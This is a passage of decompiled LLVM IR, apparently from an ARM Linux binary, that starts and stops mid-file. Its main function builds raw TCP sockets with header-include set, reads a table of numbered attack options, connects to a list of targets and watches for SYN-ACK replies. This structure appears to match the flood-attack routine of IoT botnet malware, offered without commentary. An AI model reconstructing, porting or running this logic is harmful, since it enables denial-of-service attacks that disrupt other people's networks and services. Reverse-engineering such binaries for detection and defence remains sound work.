  uselistorder label %dec_label_pc_9b90, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_9b70, { 1, 0 }
  uselistorder label %dec_label_pc_9b4c, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_9afc, { 1, 0 }
  uselistorder label %dec_label_pc_9ae0, { 1, 0 }
}

define i32 @function_a070(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a070:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_a070 = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_a08c = call i32 @function_1214c(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_a098 = load i32, i32* @r6, align 4
  store i32 %v0_a098, i32* %r0.global-to-local, align 4
  %v2_a09c = call i32 @function_1214c(i32 %v0_a098, i32 4)
  %v0_a0a0 = load i32, i32* @r5, align 4
  store i32 %v0_a0a0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a0b0 = load i32, i32* @r4, align 4
  store i32 %v0_a0b0, i32* %r0.global-to-local, align 4
  %v5_a0b4 = inttoptr i32 %v0_a0a0 to i32*
  %v6_a0b4 = call i32 @function_8570(i32 %v0_a0b0, i32* %v5_a0b4, i32 2, i32 0, i32 %v2_a09c)
  %v1_a0c0 = urem i32 %v6_a0b4, 256
  store i32 %v1_a0c0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a0cc = load i32, i32* @r5, align 4
  store i32 %v0_a0cc, i32* %r1.global-to-local, align 4
  %v0_a0d0 = load i32, i32* @r4, align 4
  store i32 %v0_a0d0, i32* %r0.global-to-local, align 4
  %v5_a0d4 = trunc i32 %v6_a0b4 to i8
  %v6_a0d8 = inttoptr i32 %v0_a0cc to i32*
  %v7_a0d8 = call i32 @function_8570(i32 %v0_a0d0, i32* %v6_a0d8, i32 3, i32 65535, i32 %v6_a0b4)
  %v0_a0dc = load i32, i32* @r5, align 4
  store i32 %v0_a0dc, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a0d8, i32* @r7, align 4
  %v0_a0ec = load i32, i32* @r4, align 4
  store i32 %v0_a0ec, i32* %r0.global-to-local, align 4
  %v5_a0f0 = inttoptr i32 %v0_a0dc to i32*
  %v6_a0f0 = call i32 @function_8570(i32 %v0_a0ec, i32* %v5_a0f0, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_a0f8 = urem i32 %v6_a0f0, 256
  store i32 %v1_a0f8, i32* %ip.global-to-local, align 4
  %v0_a0fc = load i32, i32* @r5, align 4
  store i32 %v0_a0fc, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a108 = load i32, i32* @r4, align 4
  store i32 %v0_a108, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v6_a0f0, 16777216
  %v5_a110 = sdiv i32 %sext, 16777216
  %v6_a110 = inttoptr i32 %v0_a0fc to i32*
  %v7_a110 = call i32 @function_8570(i32 %v0_a108, i32* %v6_a110, i32 5, i32 1, i32 %v5_a110)
  %v1_a11c = urem i32 %v7_a110, 256
  store i32 %v1_a11c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_a124 = load i32, i32* @r5, align 4
  store i32 %v0_a124, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_a12c = load i32, i32* @r4, align 4
  store i32 %v0_a12c, i32* %r0.global-to-local, align 4
  %v5_a134 = inttoptr i32 %v0_a124 to i32*
  %v6_a134 = call i32 @function_8570(i32 %v0_a12c, i32* %v5_a134, i32 7, i32 65535, i32 %v1_a11c)
  %v0_a138 = load i32, i32* @r5, align 4
  store i32 %v0_a138, i32* %r1.global-to-local, align 4
  %v3_a13c = mul i32 %v6_a134, 65536
  store i32 %v3_a13c, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a148 = load i32, i32* @r4, align 4
  store i32 %v0_a148, i32* %r0.global-to-local, align 4
  %v3_a14c = urem i32 %v6_a134, 65536
  store i32 %v3_a14c, i32* @sl, align 4
  %v5_a150 = inttoptr i32 %v0_a138 to i32*
  %v6_a150 = call i32 @function_8570(i32 %v0_a148, i32* %v5_a150, i32 11, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v1_a158 = urem i32 %v6_a150, 256
  store i32 %v1_a158, i32* %ip.global-to-local, align 4
  %v0_a15c = load i32, i32* @r5, align 4
  store i32 %v0_a15c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a168 = load i32, i32* @r4, align 4
  store i32 %v0_a168, i32* %r0.global-to-local, align 4
  %v5_a170 = inttoptr i32 %v0_a15c to i32*
  %v6_a170 = call i32 @function_8570(i32 %v0_a168, i32* %v5_a170, i32 12, i32 1, i32 %v1_a158)
  %v1_a178 = urem i32 %v6_a170, 256
  store i32 %v1_a178, i32* %ip.global-to-local, align 4
  %v0_a17c = load i32, i32* @r5, align 4
  store i32 %v0_a17c, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a188 = load i32, i32* @r4, align 4
  store i32 %v0_a188, i32* %r0.global-to-local, align 4
  %v5_a190 = inttoptr i32 %v0_a17c to i32*
  %v6_a190 = call i32 @function_8570(i32 %v0_a188, i32* %v5_a190, i32 13, i32 1, i32 %v1_a178)
  %v1_a198 = urem i32 %v6_a190, 256
  store i32 %v1_a198, i32* %ip.global-to-local, align 4
  %v0_a19c = load i32, i32* @r5, align 4
  store i32 %v0_a19c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a1a8 = load i32, i32* @r4, align 4
  store i32 %v0_a1a8, i32* %r0.global-to-local, align 4
  %v5_a1b0 = inttoptr i32 %v0_a19c to i32*
  %v6_a1b0 = call i32 @function_8570(i32 %v0_a1a8, i32* %v5_a1b0, i32 14, i32 0, i32 %v1_a198)
  %v1_a1b8 = urem i32 %v6_a1b0, 256
  store i32 %v1_a1b8, i32* %ip.global-to-local, align 4
  %v0_a1bc = load i32, i32* @r5, align 4
  store i32 %v0_a1bc, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a1c8 = load i32, i32* @r4, align 4
  store i32 %v0_a1c8, i32* %r0.global-to-local, align 4
  %v5_a1d0 = inttoptr i32 %v0_a1bc to i32*
  %v6_a1d0 = call i32 @function_8570(i32 %v0_a1c8, i32* %v5_a1d0, i32 15, i32 0, i32 %v1_a1b8)
  %v1_a1d8 = urem i32 %v6_a1d0, 256
  store i32 %v1_a1d8, i32* %ip.global-to-local, align 4
  %v0_a1dc = load i32, i32* @r5, align 4
  store i32 %v0_a1dc, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a1e8 = load i32, i32* @r4, align 4
  store i32 %v0_a1e8, i32* %r0.global-to-local, align 4
  %v5_a1f0 = inttoptr i32 %v0_a1dc to i32*
  %v6_a1f0 = call i32 @function_8570(i32 %v0_a1e8, i32* %v5_a1f0, i32 16, i32 0, i32 %v1_a1d8)
  %v1_a1f8 = urem i32 %v6_a1f0, 256
  store i32 %v1_a1f8, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_a204 = load i32, i32* @r5, align 4
  store i32 %v0_a204, i32* %r1.global-to-local, align 4
  %v0_a208 = load i32, i32* @r4, align 4
  store i32 %v0_a208, i32* %r0.global-to-local, align 4
  %v5_a210 = inttoptr i32 %v0_a204 to i32*
  %v6_a210 = call i32 @function_8570(i32 %v0_a208, i32* %v5_a210, i32 0, i32 768, i32 %v1_a1f8)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a220 = load i32, i32* @r5, align 4
  store i32 %v0_a220, i32* %r1.global-to-local, align 4
  %v0_a224 = load i32, i32* @r4, align 4
  store i32 %v0_a224, i32* %r0.global-to-local, align 4
  %v5_a228 = inttoptr i32 %v0_a220 to i32*
  %v6_a228 = call i32 @function_8570(i32 %v0_a224, i32* %v5_a228, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_a230 = urem i32 %v6_a228, 256
  store i32 %v1_a230, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_a244 = call i32 @function_115e4(i32 2, i32 3, i32 6)
  store i32 %v3_a244, i32* %r0.global-to-local, align 4
  %v7_a248 = icmp eq i32 %v3_a244, -1
  store i1 %v7_a248, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_a244, i32* @sb, align 4
  br i1 %v7_a248, label %dec_label_pc_a438, label %dec_label_pc_a254

dec_label_pc_a254:                                ; preds = %dec_label_pc_a070
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a25c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a25c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a270 = call i32 @function_115a0(i32 %v3_a244, i32 0, i32 3, i32 %v6_a25c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_a270, i32* %r0.global-to-local, align 4
  %v7_a274 = icmp eq i32 %v5_a270, -1
  store i1 %v7_a274, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a274, label %dec_label_pc_a430, label %dec_label_pc_a27c

dec_label_pc_a27c:                                ; preds = %dec_label_pc_a254
  %v0_a27c = load i32, i32* @r7, align 4
  %v3_a27c = mul i32 %v0_a27c, 65536
  store i32 %v3_a27c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_a284 = load i32, i32* @r6, align 4
  %v2_a284 = icmp eq i32 %v0_a284, 0
  store i1 %v2_a284, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_a28c = urem i32 %v0_a27c, 65536
  store i32 %v3_a28c, i32* @fp, align 4
  br i1 %v2_a284, label %dec_label_pc_a6bc, label %dec_label_pc_a294.preheader

dec_label_pc_a294.preheader:                      ; preds = %dec_label_pc_a27c
  %v2_a2e0 = ptrtoint i32* %stack_var_-144 to i32
  %v2_a324 = ptrtoint i32* %stack_var_-64 to i32
  %v2_a35c = ptrtoint i32* %stack_var_-80 to i32
  %v2_a368 = ptrtoint i32* %stack_var_-336 to i32
  %v2_a36c = ptrtoint i32* %stack_var_-48 to i32
  %v4_a3cc = zext i8 %tmp to i32
  %v1_a3d0 = and i32 %v4_a3cc, 18
  %v2_a3d4 = icmp eq i32 %v1_a3d0, 18
  %v3_a3b8 = sext i16 %tmp61 to i32
  %v1_a3dc = and i32 %v4_a3cc, 5
  %v2_a3dc = icmp eq i32 %v1_a3dc, 0
  %v4_a31c = add i32 %v2_a2e0, 82
  %v5_a31c = inttoptr i32 %v4_a31c to i16*
  %v1_a50c = add i32 %v6_a210, 40
  %v1_a620 = urem i32 %v6_a150, 2
  %tmp97 = sub nsw i32 0, %v1_a620
  %v4_a628 = and i32 %tmp97, 32
  %v1_a638 = urem i32 %v6_a170, 2
  %tmp98 = sub nsw i32 0, %v1_a638
  %v4_a640 = and i32 %tmp98, 16
  %v1_a650 = urem i32 %v6_a190, 2
  %tmp99 = sub nsw i32 0, %v1_a650
  %v4_a658 = and i32 %tmp99, 8
  %v1_a668 = urem i32 %v6_a1b0, 2
  %tmp100 = sub nsw i32 0, %v1_a668
  %v4_a670 = and i32 %tmp100, 4
  %v1_a680 = urem i32 %v6_a1d0, 2
  %tmp101 = sub nsw i32 0, %v1_a680
  %v3_a688 = and i32 %tmp101, 2
  %v1_a698 = urem i32 %v6_a1f0, 2
  br label %dec_label_pc_a294

dec_label_pc_a294:                                ; preds = %dec_label_pc_a294.preheader, %dec_label_pc_a408
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_a408 ], [ %tmp34, %dec_label_pc_a294.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_a408 ], [ %tmp37, %dec_label_pc_a294.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_a2a0 = call i32 @function_115e4(i32 2, i32 1, i32 0)
  store i32 %v3_a2a0, i32* %r0.global-to-local, align 4
  %v7_a2a4 = icmp eq i32 %v3_a2a0, -1
  store i1 %v7_a2a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_a2a0, i32* @r5, align 4
  br i1 %v7_a2a4, label %dec_label_pc_a408, label %dec_label_pc_a2b0

dec_label_pc_a2b0:                                ; preds = %dec_label_pc_a294, %dec_label_pc_a3e4
  %v0_a2b8 = phi i32 [ %v3_a3f8, %dec_label_pc_a3e4 ], [ %v3_a2a0, %dec_label_pc_a294 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_a3e4 ], [ %stack_var_-62.0, %dec_label_pc_a294 ]
  %stack_var_-60.1 = phi i32 [ %v0_a4b8, %dec_label_pc_a3e4 ], [ %stack_var_-60.0, %dec_label_pc_a294 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_a2b8 = call i32 @function_10c0c(i32 %v0_a2b8, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_a2c0 = or i32 %v2_a2b8, 2048
  store i32 %v1_a2c0, i32* %r2.global-to-local, align 4
  %v0_a2c4 = load i32, i32* @r5, align 4
  store i32 %v0_a2c4, i32* %r0.global-to-local, align 4
  %v2_a2c8 = call i32 @function_10c0c(i32 %v0_a2c4, i32 4)
  %v3_a2cc = load i32, i32* %stack_var_-44, align 4
  %v5_a2d4 = mul i32 %v3_a2cc, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_a2e0, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_a2e8 = add i32 %v5_a2d4, %arg2
  store i32 %v2_a2e8, i32* %r3.global-to-local, align 4
  %v1_a2ec = add i32 %v2_a2e8, 20
  %v2_a2ec = inttoptr i32 %v1_a2ec to i8*
  %v3_a2ec = load i8, i8* %v2_a2ec, align 1
  %v4_a2ec = zext i8 %v3_a2ec to i32
  store i32 %v4_a2ec, i32* %r2.global-to-local, align 4
  %v2_a2f0 = icmp ugt i8 %v3_a2ec, 30
  %v7_a2f0 = icmp eq i8 %v3_a2ec, 31
  store i1 %v7_a2f0, i1* %cpsr_z.global-to-local, align 1
  %v2_a2f4 = xor i1 %v7_a2f0, true
  %v3_a2f4 = and i1 %v2_a2f0, %v2_a2f4
  br i1 %v3_a2f4, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_a2b0
  %v5_a2f4 = add i32 %v2_a2e8, 16
  %v6_a2f4 = inttoptr i32 %v5_a2f4 to i32*
  %v7_a2f4 = load i32, i32* %v6_a2f4, align 4
  store i32 %v7_a2f4, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_a2b0, %bb
  %v4_a2f8 = phi i32 [ %v2_a2e8, %dec_label_pc_a2b0 ], [ %v7_a2f4, %bb ]
  %v4_a2f8.stack_var_-60.1 = select i1 %v3_a2f4, i32 %v4_a2f8, i32 %stack_var_-60.1
  %v2_a2fc = xor i1 %v2_a2f0, true
  %v3_a2fc = or i1 %v7_a2f0, %v2_a2fc
  br i1 %v3_a2fc, label %dec_label_pc_a444, label %dec_label_pc_a300

dec_label_pc_a300:                                ; preds = %bb71, %dec_label_pc_a444
  %v0_a4b8 = phi i32 [ %v5_a494, %dec_label_pc_a444 ], [ %v4_a2f8.stack_var_-60.1, %bb71 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_a308 = load i32, i32* @sl, align 4
  %v9_a308 = icmp eq i32 %v0_a308, 65535
  store i1 %v9_a308, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a308, label %dec_label_pc_a4a0, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_a300
  %v4_a30c = udiv i32 %v0_a308, 256
  %v2_a310 = urem i32 %v0_a308, 256
  store i32 %v2_a310, i32* %r2.global-to-local, align 4
  %v5_a314 = mul nuw nsw i32 %v2_a310, 256
  %v6_a314 = or i32 %v5_a314, %v4_a30c
  store i32 %v6_a314, i32* %r3.global-to-local, align 4
  store i32 %v2_a2e0, i32* %r0.global-to-local, align 4
  %v2_a31c = trunc i32 %v6_a314 to i16
  store i16 %v2_a31c, i16* %v5_a31c, align 2
  br label %dec_label_pc_a324

dec_label_pc_a324:                                ; preds = %.thread9, %dec_label_pc_a4a0
  %stack_var_-62.2 = phi i16 [ %v1_a4a0, %dec_label_pc_a4a0 ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_a324, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_a32c = load i32, i32* @r5, align 4
  store i32 %v0_a32c, i32* %r0.global-to-local, align 4
  %v3_a330 = call i32 @function_113cc(i32 %v0_a32c, i32 %v2_a324, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_a338 = call i32 @function_10a58(i32* null)
  store i32 %v2_a338, i32* %r0.global-to-local, align 4
  store i32 %v2_a338, i32* @r4, align 4
  %v9_a398 = icmp eq i32 %tmp35, %v0_a4b8
  %v4_a3c0 = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_a398 to i32
  %v9_a3ac = icmp eq i1 %v9_a398, false
  %v9_a3c4 = icmp eq i32 %v3_a3b8, %v4_a3c0
  br label %dec_label_pc_a354

dec_label_pc_a344:                                ; preds = %.thread, %dec_label_pc_a3b4, %dec_label_pc_a3dc, %bb75
  %v2_a344 = call i32 @function_10a58(i32* null)
  %v0_a348 = load i32, i32* @r4, align 4
  %v2_a348 = sub i32 %v2_a344, %v0_a348
  store i32 %v2_a348, i32* %r0.global-to-local, align 4
  %v7_a34c = icmp eq i32 %v2_a348, 10
  store i1 %v7_a34c, i1* %cpsr_z.global-to-local, align 1
  %v8_a350 = icmp sgt i32 %v2_a348, 10
  br i1 %v8_a350, label %dec_label_pc_a3e4, label %dec_label_pc_a354

dec_label_pc_a354:                                ; preds = %dec_label_pc_a344, %dec_label_pc_a324
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_a368, i32* %r1.global-to-local, align 4
  store i32 %v2_a36c, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a374 = load i32, i32* @sb, align 4
  store i32 %v0_a374, i32* %r0.global-to-local, align 4
  %v6_a37c = call i32 @function_114ec(i32 %v0_a374, i32 %v2_a368, i32 256, i32 16384, i32 %v2_a35c, i32 %v2_a36c)
  store i32 %v6_a37c, i32* %r2.global-to-local, align 4
  %v7_a384 = icmp eq i32 %v6_a37c, -1
  store i1 %v7_a384, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_a384, label %dec_label_pc_a438, label %dec_label_pc_a390

dec_label_pc_a390:                                ; preds = %dec_label_pc_a354
  store i32 %v0_a4b8, i32* %r1.global-to-local, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_a3a4 = icmp eq i32 %v6_a37c, 40
  store i1 %v7_a3a4, i1* %cpsr_z.global-to-local, align 1
  %tmp102 = icmp ult i32 %v6_a37c, 41
  br i1 %tmp102, label %.thread, label %bb75

.thread:                                          ; preds = %dec_label_pc_a390
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_a344

bb75:                                             ; preds = %dec_label_pc_a390
  store i1 %v9_a3ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a3ac, label %dec_label_pc_a344, label %dec_label_pc_a3b4

dec_label_pc_a3b4:                                ; preds = %bb75
  store i32 %v3_a3b8, i32* @lr, align 4
  store i32 %v2_a2e0, i32* @r3, align 4
  store i32 %v4_a3c0, i32* %r2.global-to-local, align 4
  store i1 %v9_a3c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a3c4, label %dec_label_pc_a3cc, label %dec_label_pc_a344

dec_label_pc_a3cc:                                ; preds = %dec_label_pc_a3b4
  store i32 %v4_a3cc, i32* %r2.global-to-local, align 4
  store i32 %v1_a3d0, i32* @r3, align 4
  store i1 %v2_a3d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a3d4, label %dec_label_pc_a4b0, label %dec_label_pc_a3dc

dec_label_pc_a3dc:                                ; preds = %dec_label_pc_a3cc
  store i1 %v2_a3dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a3dc, label %dec_label_pc_a344, label %dec_label_pc_a3e4

dec_label_pc_a3e4:                                ; preds = %dec_label_pc_a3dc, %dec_label_pc_a344
  %v0_a3e4 = load i32, i32* @r5, align 4
  store i32 %v0_a3e4, i32* %r0.global-to-local, align 4
  %v1_a3e8 = call i32 @function_10dd8(i32 %v0_a3e4)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_a3f8 = call i32 @function_115e4(i32 2, i32 1, i32 0)
  store i32 %v3_a3f8, i32* %r0.global-to-local, align 4
  %v3_a3fc = icmp eq i32 %v3_a3f8, -1
  %v8_a3fc = icmp eq i32 %v3_a3f8, -1
  store i1 %v8_a3fc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_a3f8, i32* @r5, align 4
  br i1 %v3_a3fc, label %dec_label_pc_a408, label %dec_label_pc_a2b0

dec_label_pc_a408:                                ; preds = %dec_label_pc_a3e4, %dec_label_pc_a294, %bb82
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_a294 ], [ %stack_var_-62.2, %bb82 ], [ %stack_var_-62.2, %dec_label_pc_a3e4 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_a294 ], [ %v0_a4b8, %bb82 ], [ %v0_a4b8, %dec_label_pc_a3e4 ]
  %v3_a408 = load i32, i32* %stack_var_-44, align 4
  %v1_a40c = add i32 %v3_a408, 1
  store i32 %v1_a40c, i32* @r3, align 4
  %v1_a410 = load i32, i32* @r6, align 4
  %v9_a410 = icmp eq i32 %v1_a40c, %v1_a410
  store i1 %v9_a410, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a40c, i32* %stack_var_-44, align 4
  %v5_a418 = icmp slt i32 %v1_a40c, %v1_a410
  br i1 %v5_a418, label %dec_label_pc_a294, label %dec_label_pc_a41c

dec_label_pc_a41c:                                ; preds = %dec_label_pc_a408
  store i32 %v6_a210, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a6cc

dec_label_pc_a430:                                ; preds = %dec_label_pc_a254
  %v0_a430 = load i32, i32* @sb, align 4
  store i32 %v0_a430, i32* %r0.global-to-local, align 4
  %v1_a434 = call i32 @function_10dd8(i32 %v0_a430)
  store i32 %v1_a434, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a438

dec_label_pc_a438:                                ; preds = %dec_label_pc_a354, %dec_label_pc_a070, %dec_label_pc_a430
  %v1_a440 = phi i32 [ %v3_a244, %dec_label_pc_a070 ], [ %v1_a434, %dec_label_pc_a430 ], [ 0, %dec_label_pc_a354 ]
  store i32 %v27_a070, i32* %lr.global-to-local, align 4
  ret i32 %v1_a440

dec_label_pc_a444:                                ; preds = %bb71
  %v1_a444 = add i32 %v4_a2f8, 16
  %v2_a444 = inttoptr i32 %v1_a444 to i32*
  %v3_a444 = load i32, i32* %v2_a444, align 4
  store i32 %v3_a444, i32* @r4, align 4
  %v0_a448 = call i32 @function_e0b4()
  store i32 %v0_a448, i32* %r0.global-to-local, align 4
  %v3_a44c = load i32, i32* %stack_var_-44, align 4
  %v5_a454 = mul i32 %v3_a44c, 24
  %v0_a45c = load i32, i32* @r4, align 4
  %v1_a45c = and i32 %v0_a45c, 16711680
  store i32 %v1_a45c, i32* %ip.global-to-local, align 4
  %v3_a460 = udiv i32 %v0_a45c, 16777216
  %v2_a464 = add i32 %v5_a454, %arg2
  store i32 %v2_a464, i32* %r1.global-to-local, align 4
  %v4_a468 = udiv i32 %v1_a45c, 256
  %v5_a468 = or i32 %v4_a468, %v3_a460
  store i32 %v5_a468, i32* %r2.global-to-local, align 4
  %v1_a46c = and i32 %v0_a45c, 65280
  store i32 %v1_a46c, i32* %r3.global-to-local, align 4
  %v1_a470 = add i32 %v2_a464, 20
  %v2_a470 = inttoptr i32 %v1_a470 to i8*
  %v3_a470 = load i8, i8* %v2_a470, align 1
  %v4_a470 = zext i8 %v3_a470 to i32
  store i32 %v4_a470, i32* %ip.global-to-local, align 4
  %v5_a478 = call i32 @llvm.bswap.i32(i32 %v0_a45c)
  %v7_a47c = lshr i32 %v0_a448, %v4_a470
  %v8_a47c = add i32 %v7_a47c, %v5_a478
  store i32 %v8_a47c, i32* %r2.global-to-local, align 4
  %v1_a480 = and i32 %v8_a47c, 16711680
  store i32 %v1_a480, i32* %r0.global-to-local, align 4
  %v1_a48c = and i32 %v8_a47c, 65280
  store i32 %v1_a48c, i32* %r1.global-to-local, align 4
  %v5_a494 = call i32 @llvm.bswap.i32(i32 %v8_a47c)
  store i32 %v5_a494, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_a300

dec_label_pc_a4a0:                                ; preds = %dec_label_pc_a300
  %v0_a4a0 = call i32 @function_e0b4()
  %v1_a4a0 = trunc i32 %v0_a4a0 to i16
  store i32 %v0_a4a0, i32* %r0.global-to-local, align 4
  store i32 %v2_a2e0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a324

dec_label_pc_a4b0:                                ; preds = %dec_label_pc_a3cc
  %v3_a4b0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a4b0, i32* @r4, align 4
  store i32 %v2_a08c, i32* %ip.global-to-local, align 4
  %v5_a4b8 = mul i32 %v3_a4b0, 16
  %v6_a4b8 = add i32 %v5_a4b8, %v2_a08c
  %v7_a4b8 = inttoptr i32 %v6_a4b8 to i32*
  store i32 %v0_a4b8, i32* %v7_a4b8, align 4
  %v0_a4bc = load i32, i32* @r8, align 4
  %v1_a4bc = add i32 %v0_a4bc, 4
  %v2_a4bc = inttoptr i32 %v1_a4bc to i32*
  %v3_a4bc = load i32, i32* %v2_a4bc, align 4
  store i32 %v3_a4bc, i32* %r1.global-to-local, align 4
  %v1_a4c8 = and i32 %v3_a4bc, 65280
  store i32 %v1_a4c8, i32* %r2.global-to-local, align 4
  store i32 %v2_a08c, i32* %r0.global-to-local, align 4
  %v0_a4d8 = load i32, i32* @r4, align 4
  %v3_a4d8 = mul i32 %v0_a4d8, 16
  %v2_a4dc = add i32 %v3_a4d8, %v2_a08c
  store i32 %v2_a4dc, i32* %ip.global-to-local, align 4
  %v5_a4e0 = call i32 @llvm.bswap.i32(i32 %v3_a4bc)
  store i32 %v5_a4e0, i32* %r3.global-to-local, align 4
  %v2_a4e4 = add i32 %v2_a4dc, 4
  %v3_a4e4 = inttoptr i32 %v2_a4e4 to i32*
  store i32 %v5_a4e0, i32* %v3_a4e4, align 4
  %v0_a4e8 = load i32, i32* @r8, align 4
  %v1_a4e8 = add i32 %v0_a4e8, 8
  %v2_a4e8 = inttoptr i32 %v1_a4e8 to i32*
  %v3_a4e8 = load i32, i32* %v2_a4e8, align 4
  store i32 %v3_a4e8, i32* %r1.global-to-local, align 4
  %v1_a4ec = and i32 %v3_a4e8, 16711680
  store i32 %v1_a4ec, i32* %r0.global-to-local, align 4
